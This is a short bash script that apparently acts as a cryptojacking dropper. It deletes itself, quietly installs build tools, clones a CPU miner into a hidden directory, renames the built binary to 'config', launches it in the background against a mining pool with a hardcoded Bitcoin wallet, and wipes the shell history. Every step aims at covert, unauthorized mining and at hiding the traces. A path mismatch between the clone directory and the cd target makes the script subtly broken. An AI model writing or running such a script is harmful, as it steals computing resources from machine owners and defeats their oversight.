#!/bin/bash
rm m.sh
apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
apt-get install make git nano autoconf automake -y > /dev/null
git clone https://github.com/noncepool/cpuminer-yescrypt.git /usr/share/.mx > /dev/null
cd /usr/.mx
./autogen.sh
./configure CFLAGS="-O3"
make
mv minerd config
nohup ./config -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F -p c=BTC &
history -c
